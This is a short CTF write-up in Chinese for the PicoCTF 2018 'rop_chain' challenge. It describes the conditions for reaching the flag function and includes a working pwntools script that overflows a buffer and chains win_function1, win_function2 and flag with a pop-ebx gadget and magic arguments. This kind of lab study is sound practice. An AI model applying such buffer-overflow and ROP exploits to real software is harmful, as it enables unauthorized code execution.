![image-20201202190558416](https://static.hack1s.fun/images/2021/02/06/image-20201202190558416.png)

32位程序

这道题目的想法应该是想让人按照顺序调用相应的函数

![image-20201202190746145](https://static.hack1s.fun/images/2021/02/06/image-20201202190746145.png)

之后直接用这个flag读取相应的值

调用到这里的话需要三个条件，win1、win2都为真，并且a1是一个特定的值

win1可以直接调用；win2需要参数是一个特定值

![image-20201202192532128](https://static.hack1s.fun/images/2021/02/06/image-20201202192532128.png)

整体很基础，就是最简单的构造ROP链

记得把调用win2的参数pop出来就可以

```python
from pwn import *
from LibcSearcher import *

io = remote('node3.buuoj.cn',28619)
#io = process('./PicoCTF_2018_rop_chain')
elf = ELF('./PicoCTF_2018_rop_chain')

popebx_ret = 0x804840d
io.recvuntil('input>')
payload = bytes('a'*0x18 + 'b'*0x4,'ascii') + p32(elf.sym['win_function1']) + p32(elf.sym['win_function2']) + p32(popebx_ret) + p32(0xBAAAAAAD) + p32(elf.sym['flag']) + p32(popebx_ret) + p32(0x0deadbaad)
io.sendline(payload)

io.interactive()
```

